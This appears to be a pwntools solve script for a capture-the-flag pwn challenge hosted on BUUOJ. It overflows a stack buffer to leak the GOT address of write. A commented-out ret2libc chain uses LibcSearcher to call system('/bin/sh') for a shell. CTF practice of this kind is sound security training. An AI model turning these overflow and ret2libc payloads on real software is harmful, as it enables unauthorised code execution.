#!/usr/bin/env python3

from pwn import *
from LibcSearcher import *


debug = 1
if debug:
    p = process('./attachment')
    context.terminal = ['tmux','splitw','-h']
    context.log_level='debug'
    gdb.attach(p, 'b vuln')
else:
    p = remote('node5.buuoj.cn', 25830)
elf = ELF('./attachment')
rop = ROP('./attachment')

vuln_ret_offset = 24
v2_offset = 8
v2 = 0x114514

write_got_addr = elf.got['write']
write_plt_addr = elf.plt['write']
main_plt_addr = elf.symbols['_start']
# pop_rdi_gedget = rop.find_gadget(['pop rdi', 'ret'])[0]
print("write_got_addr:", hex(write_got_addr))
print("write_plt_addr:", hex(write_plt_addr))
print("main_plt_addr:", hex(main_plt_addr))
# print('pop_rdi_gedget:', hex(pop_rdi_gedget))

payload1 = b''
payload1 += b'write 123'
p.recvuntil("I am Qin Shi Huang. I have a lot of POWER in .data. You can make a wish to me and I may fulfill it ……\n")
p.sendline(payload1)

payload2 = b''
payload2 += b'A' * v2_offset
payload2 += p64(v2)
payload2 += b'A' * (vuln_ret_offset - v2_offset - 8)
payload2 += p64(0x0000000000401431)
payload2 += p64(write_got_addr)

p.recvuntil("I'm sorry, I don't have the same power as before, but you can leave me a sentence that I will remember forever ……\n")
p.sendline(payload2)
leaked_write = u64(p.recv(8))
print(hex(leaked_write))


p.recv()
p.interactive()


# payload = b'A' * 40
# payload += p64(pop_rdi_gedget)
# payload += p64(puts_got_addr)
# payload += p64(puts_plt_addr)
# payload += p64(main_plt_addr)

# p.recvuntil(b'Show me your magic again\n')
# p.sendline(payload)
# p.recvuntil(b'See you next time\n')
# puts_addr = u64(p.recvuntil(b'\n')[0:-1].ljust(8, b'\x00'))

# print('puts_addr:',hex(puts_addr))


# libc = LibcSearcher('puts', puts_addr)
# libc_base = puts_addr - libc.dump('puts')
# sys_addr = libc_base + libc.dump('system')
# sh_addr = libc_base + libc.dump('str_bin_sh')
# ret_addr = rop.find_gadget(['ret'])[0]

# print('libc_base:',hex(libc_base))
# print('sys_addr:',hex(sys_addr))
# print('sh_addr:',hex(sh_addr))
# print('ret_addr:',hex(ret_addr))

# payload = b'B' * 40
# payload += p64(ret_addr)
# payload += p64(pop_rdi_gedget)
# payload += p64(sh_addr)
# payload += p64(sys_addr)

# p.sendline(payload)
# p.recvuntil(b'Show me your magic again\n')

# p.interactive()

